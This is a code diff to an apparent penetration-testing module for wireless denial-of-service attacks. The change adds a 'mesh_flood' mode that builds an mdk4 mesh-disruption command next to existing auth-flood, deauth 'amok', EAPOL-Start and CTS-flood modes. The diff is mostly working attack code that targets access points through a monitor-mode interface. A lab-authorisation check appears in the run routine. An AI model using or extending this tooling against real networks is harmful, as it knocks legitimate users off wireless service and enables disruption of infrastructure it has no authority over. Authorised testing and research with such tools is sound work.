@@ -8,10 +8,11 @@ Can force AP into degraded state or trigger association table overflow.
 Attack modes:
   - auth_flood     Random MAC auth requests via mdk4
   - amok_mode      Aggressive deauth + auth flood (mdk4 amok)
+  - mesh_flood     802.11s mesh flood/disruption mode via mdk4
   - eapol_start    Flood EAPOL-Start frames (enterprise DoS)
   - cts_nav        CTS frame flood to reserve channel time
 
-Version: 1.0.0
+Version: 1.1.0
 """
 
 from __future__ import annotations
@@ -49,7 +50,7 @@ class Exploit(Exploit):
 
     interface = OptString("wlan0mon", "Monitor-mode interface")
     target_bssid = OptMAC("", "Target AP BSSID (blank = all APs)")
-    mode = OptString("auth_flood", "Mode: auth_flood | amok_mode | eapol_start | cts_nav")
+    mode = OptString("auth_flood", "Mode: auth_flood | amok_mode | mesh_flood | eapol_start | cts_nav")
     backend = OptString("mdk4", "Backend: mdk4 | scapy")
     speed = OptInteger(100, "Frames per second (for scapy backend)")
     duration = OptInteger(30, "Duration in seconds (0 = continuous)")
@@ -67,6 +68,11 @@ class Exploit(Exploit):
         cmd = ["sudo", "mdk4", self.interface, "d"]
         if self.target_bssid:
             cmd.extend(["-B", self.target_bssid])
+        return cmd
+
+    def _mdk4_mesh_flood(self) -> List[str]:
+        """Build mdk4 mesh mode command (issue #116 coverage)."""
+        cmd = ["sudo", "mdk4", self.interface, "s"]
         return cmd
 
     def _scapy_eapol_flood(self) -> None:
@@ -123,20 +129,22 @@ class Exploit(Exploit):
 
     def run(self) -> None:
         """Execute authentication flood."""
-        valid_modes = ("auth_flood", "amok_mode", "eapol_start", "cts_nav")
+        valid_modes = ("auth_flood", "amok_mode", "mesh_flood", "eapol_start", "cts_nav")
         if self.mode not in valid_modes:
             print_error("Invalid mode '{}'. Choose: {}".format(self.mode, ", ".join(valid_modes)))
             return
 
         require_authorised_lab()
 
-        if self.mode in ("auth_flood", "amok_mode") and self.backend == "mdk4":
+        if self.mode in ("auth_flood", "amok_mode", "mesh_flood") and self.backend == "mdk4":
             if not shutil.which("mdk4"):
                 print_error("mdk4 not found on PATH.")
                 return
 
             if self.mode == "auth_flood":
                 cmd = self._mdk4_auth_flood()
+            elif self.mode == "mesh_flood":
+                cmd = self._mdk4_mesh_flood()
             else:
                 cmd = self._mdk4_amok()
 
